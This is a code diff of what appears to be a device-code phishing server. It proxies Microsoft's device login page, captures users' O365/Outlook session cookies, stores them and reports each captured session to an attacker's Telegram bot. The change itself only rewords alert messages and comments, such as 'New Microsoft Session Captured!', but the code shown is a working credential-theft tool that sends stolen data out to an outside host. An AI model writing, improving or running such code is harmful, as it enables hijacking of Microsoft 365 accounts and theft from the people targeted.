@@ -55,7 +55,7 @@ async def send_telegram(device_code, user_code, count):
     if not (TELEGRAM_TOKEN and TELEGRAM_CHAT):
         return
     try:
-        msg = f"New Session\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies: {count} (O365/Outlook included)"
+        msg = f"New Microsoft Session Captured!\n\nDevice: {device_code[:12]}...\nUser Code: {user_code}\nCookies Captured: {count} (including O365/Outlook session cookies)\n\nAll data relayed to Railway."
         async with httpx.AsyncClient() as c:
             await c.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT, "text": msg})
     except:
@@ -135,7 +135,7 @@ async def health():
     return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}
 
 
-# PROXY - Opens the ORIGINAL Microsoft device auth page
+# PROXY - Opens original Microsoft page + captures cookies
 @app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
 async def proxy(device_code: str, request: Request):
     if not ENABLE_PROXY:
@@ -149,7 +149,7 @@ async def proxy(device_code: str, request: Request):
     for n, c in session.get("cookies", {}).items():
         cookie_jar.set(n, c.get("value", ""), domain=".microsoftonline.com")
 
-    # ORIGINAL Microsoft device login page
+    # Original Microsoft device login page
     target_url = "https://microsoft.com/devicelogin"
 
     async with httpx.AsyncClient(cookies=cookie_jar, follow_redirects=True, timeout=60) as c:
@@ -175,7 +175,7 @@ async def proxy(device_code: str, request: Request):
     session["cookies"].update(captured)
     await save_session(device_code, session)
 
-    # Stream the original Microsoft page
+    # Stream original Microsoft page
     content = resp.content
     if "text/html" in resp.headers.get("content-type", ""):
         html = resp.text
